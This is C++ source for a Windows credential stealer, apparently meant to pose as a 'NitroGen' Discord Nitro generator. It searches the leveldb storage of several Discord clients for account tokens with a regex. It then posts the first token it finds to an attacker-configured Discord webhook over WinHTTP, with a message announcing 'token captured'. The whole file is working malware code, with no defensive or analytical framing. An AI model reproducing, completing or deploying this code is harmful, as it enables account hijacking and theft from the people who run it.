// grabber.h
#pragma once
void run_grabber();
// grabber.cpp
#include "grabber.h"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <regex>
#include <string>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// ============ CONFIG ============
// mets ton webhook ici
static const std::wstring WEBHOOK_URL =
    L"https://discord.com/api/webhooks/XXXXXXXX/YYYYYYYY";
// ================================

std::string get_appdata() {
    char buf[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, buf)))
        return std::string(buf);
    return "";
}

// cherche le token dans les fichiers leveldb de Discord
std::string find_discord_token() {
    std::string appdata = get_appdata();
    if (appdata.empty()) return "";

    std::vector<std::string> paths = {
        "\\discord\\Local Storage\\leveldb\\",
        "\\discordcanary\\Local Storage\\leveldb\\",
        "\\discordptb\\Local Storage\\leveldb\\",
        "\\Lightcord\\Local Storage\\leveldb\\",
        "\\discorddevelopment\\Local Storage\\leveldb\\",
    };

    // regex token Discord (format standard)
    std::regex token_re(
        R"(([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})|(mfa\.[\w-]{84}))",
        std::regex::optimize);

    for (const auto& sub : paths) {
        std::string full = appdata + sub;
        WIN32_FIND_DATAA fd;
        std::string search = full + "*.*";
        HANDLE h = FindFirstFileA(search.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;

        do {
            std::string name = fd.cFileName;
            if (name == "." || name == "..") continue;
            if (name.size() < 4) continue;
            std::string ext = name.substr(name.size() - 4);
            if (ext != ".ldb" && ext != ".log") continue;

            std::ifstream f(full + name, std::ios::binary);
            if (!f) continue;

            std::stringstream ss;
            ss << f.rdbuf();
            std::string content = ss.str();

            std::smatch m;
            if (std::regex_search(content, m, token_re)) {
                FindClose(h);
                return m.str();
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return "";
}

// envoie au webhook
void exfil(const std::string& token) {
    if (token.empty()) return;

    std::string json =
        "{\"content\":\"**NitroGen by Rubilacxe - token captured**\\n"
        "```\\n" + token + "\\n```\"}";

    // parse URL
    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {}, path[1024] = {};
    uc.lpszHostName = host; uc.dwHostNameLength = 255;
    uc.lpszUrlPath = path;  uc.dwUrlPathLength  = 1023;

    WinHttpCrackUrl(WEBHOOK_URL.c_str(), 0, 0, &uc);

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    HINTERNET hReq = WinHttpOpenRequest(hConnect, L"POST", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::wstring headers = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(hReq, headers.c_str(), -1L,
        (LPVOID)json.c_str(), (DWORD)json.size(),
        (DWORD)json.size(), 0);
    WinHttpReceiveResponse(hReq, NULL);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void run_grabber() {
    std::string token = find_discord_token();
    if (!token.empty()) exfil(token);
}
